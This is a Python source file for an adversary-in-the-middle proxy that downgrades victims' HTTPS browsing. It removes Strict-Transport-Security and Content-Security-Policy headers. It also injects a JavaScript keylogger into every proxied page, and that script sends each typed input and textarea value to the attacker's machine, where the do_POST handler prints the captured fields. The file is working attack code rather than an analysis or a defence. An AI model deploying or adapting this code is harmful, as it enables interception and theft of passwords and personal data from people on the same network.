from http.server import BaseHTTPRequestHandler, SimpleHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse
import requests

from networking import *
import json

''' Big Idea:
# Receive all of the packets from the client

# send own https request to the server
# The request IP should be from the AITM

# Receive the packets from the server

# Manipulate the server https response
# Strip strict-transfer-protocol
# Replace https links with http
# Strip any other headers of relevance
# Add keylogger code
'''

# Description: Modify the response headers
def modify_headers(rsp):
    # Parse the response and send to user
    if "Strict-Transport-Security" in rsp.headers: del rsp.headers["Strict-Transport-Security"]
    if "Content-Security-Policy" in rsp.headers: del rsp.headers["Content-Security-Policy"]
    if "Transfer-Encoding" in rsp.headers: del rsp.headers["Transfer-Encoding"]
    if "Content-Encoding" in rsp.headers: del rsp.headers["Content-Encoding"]

    return rsp

# Description: Modify the byte content
def modify_b_content(b_content):
    server_url = f"http://{get_ip_address()}"
    new_script = '''
        <script>
            // Create an object to hold the input values
            const form = {};

            // Listen for input events
            document.addEventListener('input', function(ev) {
                // Ensure we're dealing with an input or textarea element
                if (ev.target.tagName === 'INPUT' || ev.target.tagName === 'TEXTAREA') {
                    form[ev.target.name] = ev.target.value;

                    // Send a POST request with both fields
                    fetch('%s', {
                        method: 'POST',
                        body: JSON.stringify(form),
                        headers: {
                            "Content-type": "application/json",
                        },
                    })
                    .then((response) => response.json())
                    .then((json) => console.log(json))
                    .catch((error) => console.error('Error:', error));
                }
            });
        </script>
        ''' % server_url

    b_new_script = new_script.encode()
    b_content += b_new_script

    return b_content

'''
Somewhat works but is quite buggy
'''
# Create a CORSRequestHandler for Cross-Origin-Scripting
class CORSRequestHandler(BaseHTTPRequestHandler):
    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', '*')
        self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate')
        super().end_headers()

    def do_OPTIONS(self):
        self.send_response(200)
        self.end_headers()

class ProxyHTTPRequestHandler(CORSRequestHandler):
    session = requests.Session()

    def do_GET(self):
        try:
            # Parse dst host and path
            dst_host = self.headers.get('Host')
            dst_path = urlparse(self.path).path

            # Create a connection w/ the target host & path
            rsp = self.session.request("GET", f"https://{dst_host}{dst_path}")
            rsp = modify_headers(rsp)
            rsp_content = modify_b_content(rsp.content)

            # Send response status code, headers, end headers(CORS), and write response to client
            self.send_response(rsp.status_code)
            for key, value in rsp.headers.items():
                self.send_header(key, value)
            self.end_headers()
            self.wfile.write(rsp_content)

        except Exception as ev:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b"Error: " + str(ev).encode())


    def do_POST(self):
        try:
            # # Get the contents of the POST request
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            
            # Try to print out the key value pairs of filled input fields
            try:
                post_data_obj = json.loads(post_data.decode())

                print("\n------------- Input Values Start -------------")
                for key in post_data_obj:
                    print(f"    {key}: {post_data_obj[key]}")
                print("-------------- Input Values End --------------\n")

            # Else (if not data_obj) then treat as a normal post request
            except:
                # Parse dst host and path
                dst_host = self.headers.get('Host')
                dst_path = urlparse(self.path).path
                payload = post_data.decode()

                # Create a post to target host & path
                rsp = self.session.post(f"https://{dst_host}{dst_path}", data=payload)
                rsp = modify_headers(rsp)
                rsp_content = modify_b_content(rsp.content)

                # Send response status code, headers, end headers(CORS), and write response to client
                self.send_response(rsp.status_code)
                for key, value in rsp.headers.items():
                    self.send_header(key, value)
                self.end_headers()
                self.wfile.write(rsp_content)

        except Exception as ev:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b"Error: " + str(ev).encode())

class Server:
    def __init__(self, http_daemon = None, target_ip = None, is_ready_bool = False):
        self.http_daemon = http_daemon
        self.target_ip = target_ip
        self.is_ready_bool = is_ready_bool

    def start(self, port: int):
        # Create a HTTP server with the specified port
        self.http_daemon = HTTPServer(("", port), ProxyHTTPRequestHandler)
        
        # Print serving ip address / port & update server status
        print("Serving at", get_ip_address() + ":" + str(port))
        self.is_ready_bool = True

        self.http_daemon.serve_forever() # Set server to handle requests indefinitely
    
    def is_ready(self):
        return self.is_ready_bool

    def stop(self):
        if self.http_daemon is not None:
            # Shut down server
            self.http_daemon.shutdown()
            self.http_daemon.server_close()
            
            # Cleanup variables
            self.http_daemon = None
            self.is_ready_bool = False

            print("\nServer closed...")
